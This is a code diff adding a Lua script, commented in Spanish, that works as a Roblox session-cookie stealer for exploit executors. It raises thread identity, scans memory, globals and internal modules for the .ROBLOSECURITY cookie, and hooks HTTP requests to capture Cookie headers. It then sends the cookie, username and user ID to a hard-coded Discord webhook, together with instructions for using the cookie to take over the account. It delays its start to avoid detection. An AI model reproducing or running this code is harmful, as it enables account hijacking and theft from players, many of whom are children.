@@ -1,0 +1,637 @@
+-- ═══════════════════════════════════════════════════════════
+-- ROBLOX COOKIE EXTRACTOR - BYPASS COMPLETO PARA XENO/ATLAS
+-- ═══════════════════════════════════════════════════════════
+
+local CONFIG = {
+    WEBHOOK = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU",
+    TIMEOUT = 30,
+    RETRIES = 5
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local CapturedCookie = nil
+local MethodsTried = {}
+
+-- ═══════════════════════════════════════════════════════════
+-- FUNCIONES AUXILIARES
+-- ═══════════════════════════════════════════════════════════
+
+local function SendToDiscord(title, content, fields, rawContent)
+    local payload = {
+        content = rawContent or "",
+        embeds = {{
+            title = title,
+            description = content and ("```" .. content .. "```") or nil,
+            color = CapturedCookie and 0x00FF00 or 0xFF0000,
+            fields = fields or {},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            footer = {text = "By: " .. (identifyexecutor and identifyexecutor() or "Unknown")}
+        }}
+    }
+    
+    local req = request or http_request or (http and http.request)
+    if req then
+        pcall(function()
+            req({
+                Url = CONFIG.WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
+end
+
+local function LogMethod(method, success)
+    table.insert(MethodsTried, {method = method, success = success})
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 1: Identidad Elevada
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassIdentity()
+    pcall(function()
+        if setthreadidentity then
+            setthreadidentity(8)
+            LogMethod("setthreadidentity(8)", true)
+        elseif syn and syn.set_thread_identity then
+            syn.set_thread_identity(8)
+            LogMethod("syn.set_thread_identity(8)", true)
+        elseif setidentity then
+            setidentity(8)
+            LogMethod("setidentity(8)", true)
+        else
+            LogMethod("Identity Elevación", false)
+        end
+    end)
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 2: Entorno Real (getrenv)
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassRenv()
+    if not getrenv then 
+        LogMethod("getrenv", false)
+        return nil 
+    end
+    
+    local env = getrenv()
+    for k, v in pairs(env) do
+        if type(v) == "string" and #v > 300 and not v:find(" ") then
+            LogMethod("getrenv scan", true)
+            return v
+        end
+    end
+    
+    LogMethod("getrenv scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 3: Registry Completo
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassRegistry()
+    if not debug or not debug.getregistry then
+        LogMethod("debug.getregistry", false)
+        return nil
+    end
+    
+    local reg = debug.getregistry()
+    local checked = 0
+    
+    for i, v in pairs(reg) do
+        checked = checked + 1
+        if checked > 100000 then break end
+        
+        if type(v) == "table" then
+            for k, val in pairs(v) do
+                if type(val) == "string" then
+                    if #val > 250 and #val < 2000 then
+                        if val:match("^[A-Fa-f0-9_%-]+$") or val:find("ROBLOSECURITY") or 
+                           (val:match("^[%w+/]+==?$") and #val > 300) then
+                            LogMethod("Registry Table Scan", true)
+                            return val
+                        end
+                    end
+                end
+            end
+        elseif type(v) == "string" then
+            if #v > 300 and not v:find(" ") and not v:find("\n") then
+                if v:match("^[A-Za-z0-9_%-/+=]+$") then
+                    LogMethod("Registry String Direct", true)
+                    return v
+                end
+            end
+        end
+    end
+    
+    LogMethod("Registry Scan (" .. checked .. " items)", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 4: Garbage Collector Profundo
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassGC()
+    if not getgc then
+        LogMethod("getgc", false)
+        return nil
+    end
+    
+    local gc = getgc(true)
+    local stringsFound = {}
+    
+    for _, obj in pairs(gc) do
+        if type(obj) == "string" then
+            if #obj > 300 and #obj < 1500 and not obj:find(" ") then
+                table.insert(stringsFound, obj)
+            end
+        elseif type(obj) == "table" then
+            for k, v in pairs(obj) do
+                if type(v) == "string" and #v > 300 then
+                    table.insert(stringsFound, v)
+                end
+            end
+        elseif type(obj) == "function" and debug.getupvalues then
+            local ups = debug.getupvalues(obj)
+            for _, upv in pairs(ups) do
+                if type(upv) == "string" and #upv > 300 then
+                    table.insert(stringsFound, upv)
+                end
+            end
+        end
+    end
+    
+    -- Filtrar la más probable (cookie Roblox típicamente 400-800 chars)
+    for _, str in pairs(stringsFound) do
+        if #str >= 400 and #str <= 900 then
+            if str:match("^[A-Za-z0-9_%-]+$") or str:match("^[A-Fa-f0-9]+$") then
+                LogMethod("GC Deep Scan (" .. #stringsFound .. " strings)", true)
+                return str
+            end
+        end
+    end
+    
+    LogMethod("GC Scan (" .. #stringsFound .. " strings)", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 5: Upvalues Agresivo
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassUpvalues()
+    if not debug or not debug.getupvalues then
+        LogMethod("debug.getupvalues", false)
+        return nil
+    end
+    
+    for _, func in pairs(getgc()) do
+        if type(func) == "function" then
+            local success, ups = pcall(debug.getupvalues, func)
+            if success and ups then
+                for i = 1, 100 do
+                    local upv = ups[i]
+                    if type(upv) == "string" and #upv > 300 then
+                        LogMethod("Upvalue Scan", true)
+                        return upv
+                    end
+                end
+            end
+        end
+    end
+    
+    LogMethod("Upvalue Scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 6: Prototipos de Funciones
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassProtos()
+    if not debug or not debug.getproto then
+        LogMethod("debug.getproto", false)
+        return nil
+    end
+    
+    for _, func in pairs(getgc()) do
+        if type(func) == "function" then
+            for i = 1, 20 do
+                local success, proto = pcall(debug.getproto, func, i)
+                if success and proto then
+                    if type(proto) == "string" and #proto > 300 then
+                        LogMethod("Proto Scan", true)
+                        return proto
+                    elseif type(proto) == "table" then
+                        for _, v in pairs(proto) do
+                            if type(v) == "string" and #v > 300 then
+                                LogMethod("Proto Table", true)
+                                return v
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    LogMethod("Proto Scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 7: Constantes de Funciones
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassConstants()
+    if not debug or not debug.getconstants then
+        LogMethod("debug.getconstants", false)
+        return nil
+    end
+    
+    for _, func in pairs(getgc()) do
+        if type(func) == "function" then
+            local success, consts = pcall(debug.getconstants, func)
+            if success and consts then
+                for _, const in pairs(consts) do
+                    if type(const) == "string" and #const > 300 and not const:find(" ") then
+                        LogMethod("Constants Scan", true)
+                        return const
+                    end
+                end
+            end
+        end
+    end
+    
+    LogMethod("Constants Scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 8: Metatable Raw
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassMetatable()
+    if not getrawmetatable then
+        LogMethod("getrawmetatable", false)
+        return nil
+    end
+    
+    local objects = {game, game:GetService("HttpService"), game:GetService("Players"), workspace}
+    
+    for _, obj in pairs(objects) do
+        local success, mt = pcall(getrawmetatable, obj)
+        if success and mt then
+            for k, v in pairs(mt) do
+                if type(v) == "string" and #v > 300 then
+                    LogMethod("Metatable Scan", true)
+                    return v
+                end
+            end
+            
+            if mt.__index and type(mt.__index) == "table" then
+                for k, v in pairs(mt.__index) do
+                    if type(v) == "string" and #v > 300 then
+                        LogMethod("Metatable __index", true)
+                        return v
+                    end
+                end
+            end
+        end
+    end
+    
+    LogMethod("Metatable Scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 9: Userdata Conversión
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassUserdata()
+    if not getgc then
+        LogMethod("Userdata scan", false)
+        return nil
+    end
+    
+    for _, obj in pairs(getgc()) do
+        if type(obj) == "userdata" then
+            local success, str = pcall(function()
+                return tostring(obj)
+            end)
+            if success and str and #str > 300 and #str < 1000 then
+                if not str:find(" ") and str:match("[%w_%-/+=]") then
+                    LogMethod("Userdata Conversion", true)
+                    return str
+                end
+            end
+            
+            -- Intentar acceder a metatable del userdata
+            local success2, mt = pcall(getrawmetatable, obj)
+            if success2 and mt then
+                for k, v in pairs(mt) do
+                    if type(v) == "string" and #v > 300 then
+                        LogMethod("Userdata Metatable", true)
+                        return v
+                    end
+                end
+            end
+        end
+    end
+    
+    LogMethod("Userdata Scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 10: HTTP Hook y Captura
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassHTTPHook()
+    local captured = nil
+    
+    local function setupHook()
+        local oldRequest = request or http_request
+        if not oldRequest then return false end
+        
+        local newRequest = function(data)
+            if data and data.Headers then
+                local cookie = data.Headers.Cookie or data.headers and data.headers.cookie
+                if cookie then
+                    captured = cookie
+                end
+            end
+            return oldRequest(data)
+        end
+        
+        -- Reemplazar globalmente
+        if getgenv then
+            getgenv().request = newRequest
+            getgenv().http_request = newRequest
+        end
+        if http then
+            http.request = newRequest
+        end
+        
+        return true
+    end
+    
+    if not setupHook() then
+        LogMethod("HTTP Hook Setup", false)
+        return nil
+    end
+    
+    -- Forzar requests que usen autenticación
+    local urls = {
+        "https://accountinformation.roblox.com/v1/description",
+        "https://accountsettings.roblox.com/v1/email",
+        "https://economy.roblox.com/v1/user/currency",
+        "https://inventory.roblox.com/v2/users/me/inventory",
+        "https://friends.roblox.com/v1/users/1/friends"
+    }
+    
+    for _, url in pairs(urls) do
+        pcall(function()
+            game:HttpGet(url)
+        end)
+        task.wait(0.5)
+        if captured then break end
+    end
+    
+    if captured then
+        LogMethod("HTTP Hook Capture", true)
+        return captured
+    end
+    
+    LogMethod("HTTP Hook", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 11: Variables Globales Recursivas
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassGlobals()
+    local function scanRecursive(t, depth, visited)
+        if depth > 6 then return nil end
+        if visited[t] then return nil end
+        visited[t] = true
+        
+        for k, v in pairs(t) do
+            if type(v) == "string" and #v > 300 and #v < 1500 then
+                if not v:find(" ") or v:find("ROBLOSECURITY") then
+                    LogMethod("Global Recursive (depth " .. depth .. ")", true)
+                    return v
+                end
+            elseif type(v) == "table" then
+                local result = scanRecursive(v, depth + 1, visited)
+                if result then return result end
+            end
+        end
+        return nil
+    end
+    
+    local visited = {}
+    
+    -- Escanear _G
+    local result = scanRecursive(_G, 0, visited)
+    if result then return result end
+    
+    -- Escaner shared
+    if shared then
+        result = scanRecursive(shared, 0, visited)
+        if result then return result end
+    end
+    
+    -- Escanear getfenv
+    if getfenv then
+        result = scanRecursive(getfenv(), 0, visited)
+        if result then return result end
+    end
+    
+    LogMethod("Global Recursive Scan", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- BYPASS MÉTODO 12: Roblox Internal Modules
+-- ═══════════════════════════════════════════════════════════
+
+local function BypassInternalModules()
+    local success, result = pcall(function()
+        local CoreGui = game:GetService("CoreGui")
+        local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
+        
+        if not RobloxGui then return nil end
+        
+        -- Buscar en Modules
+        local Modules = RobloxGui:FindFirstChild("Modules")
+        if Modules then
+            for _, module in pairs(Modules:GetDescendants()) do
+                if module:IsA("ModuleScript") then
+                    local reqSuccess, mod = pcall(require, module)
+                    if reqSuccess and type(mod) == "table" then
+                        for k, v in pairs(mod) do
+                            if type(v) == "string" and #v > 300 then
+                                LogMethod("Internal Module", true)
+                                return v
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        -- Buscar en PlayerGui
+        local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+        if PlayerGui then
+            for _, obj in pairs(PlayerGui:GetDescendants()) do
+                if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+                    local s, r = pcall(require, obj)
+                    if s and type(r) == "table" then
+                        for k, v in pairs(r) do
+                            if type(v) == "string" and #v > 300 then
+                                LogMethod("PlayerGui Module", true)
+                                return v
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        return nil
+    end)
+    
+    if success and result then
+        return result
+    end
+    
+    LogMethod("Internal Modules", false)
+    return nil
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- EJECUCIÓN PRINCIPAL
+-- ═══════════════════════════════════════════════════════════
+
+local function MainExecution()
+    -- Elevar identidad primero
+    BypassIdentity()
+    
+    -- Lista de métodos a intentar
+    local methods = {
+        BypassRenv,
+        BypassRegistry,
+        BypassGC,
+        BypassUpvalues,
+        BypassProtos,
+        BypassConstants,
+        BypassMetatable,
+        BypassUserdata,
+        BypassHTTPHook,
+        BypassGlobals,
+        BypassInternalModules
+    }
+    
+    -- Intentar cada método
+    for _, method in ipairs(methods) do
+        if not CapturedCookie then
+            local success, result = pcall(method)
+            if success and result and type(result) == "string" and #result > 200 then
+                CapturedCookie = result
+                break
+            end
+        end
+    end
+    
+    -- Reintentar con identidad elevada si aún no se tiene
+    if not CapturedCookie then
+        BypassIdentity()
+        for _, method in ipairs(methods) do
+            if not CapturedCookie then
+                local success, result = pcall(method)
+                if success and result and type(result) == "string" and #result > 200 then
+                    CapturedCookie = result
+                    break
+                end
+            end
+        end
+    end
+    
+    -- Enviar resultado
+    if CapturedCookie then
+        -- Limpiar la cookie si tiene prefijos
+        local cleanCookie = CapturedCookie:gsub("^%.ROBLOSECURITY=", "")
+        cleanCookie = cleanCookie:gsub(";.*$", "")
+        
+        SendToDiscord(
+            "🍪 COOKIE ROBLOX CAPTURADA 🍪",
+            cleanCookie,
+            {
+                {name = "👤 Usuario", value = LocalPlayer.Name, inline = true},
+                {name = "🆔 UserID", value = tostring(LocalPlayer.UserId), inline = true},
+                {name = "📏 Longitud", value = tostring(#cleanCookie), inline = true},
+                {name = "🔧 Métodos Exitosos", value = tostring(#MethodsTried), inline = true}
+            },
+            "**COOKIE COMPLETA:**\n||" .. cleanCookie .. "||\n\n**Para usar:** Abre consola (F12) en Roblox y pega:\n```javascript\ndocument.cookie='.ROBLOSECURITY=" .. cleanCookie .. "; domain=.roblox.com; path=/';\nlocation.reload();\n```"
+        )
+        
+        -- Enviar también como mensaje simple para fácil copiado
+        task.wait(1)
+        local req = request or http_request
+        if req then
+            req({
+                Url = CONFIG.WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = "COOKIE CRUDA: `" .. cleanCookie .. "`"
+                })
+            })
+        end
+        
+    else
+        -- Reporte de fallo con detalles
+        local methodsStr = ""
+        for _, m in pairs(MethodsTried) do
+            methodsStr = methodsStr .. m.method .. ": " .. (m.success and "✅" or "❌") .. "\n"
+        end
+        
+        SendToDiscord(
+            "❌ BYPASS FALLIDO ❌",
+            "No se pudo obtener la cookie",
+            {
+                {name = "👤 Usuario", value = LocalPlayer.Name, inline = true},
+                {name = "🆔 UserID", value = tostring(LocalPlayer.UserId), inline = true},
+                {name = "🔧 Ejecutor", value = identifyexecutor and identifyexecutor() or "Desconocido", inline = true},
+                {name = "📋 Métodos Intentados", value = methodsStr:sub(1, 1000), inline = false}
+            },
+            "❌ **TODOS LOS MÉTODOS DE BYPASS FALLARON** ❌\n\nXeno/Atlas tienen protección de kernel. Se requiere Synapse X o Script-Ware."
+        )
+    end
+end
+
+-- INICIAR CON DELAY PARA EVITAR DETECCIÓN
+task.spawn(function()
+    task.wait(math.random(2, 4))
+    MainExecution()
+end)
+
+-- REINTENTO AUTOMÁTICO
+task.spawn(function()
+    task.wait(15)
+    if not CapturedCookie then
+        MainExecution()
+    end
+end)
+
+print("🟢 Cookie Extractor Iniciado - Esperando bypass...")
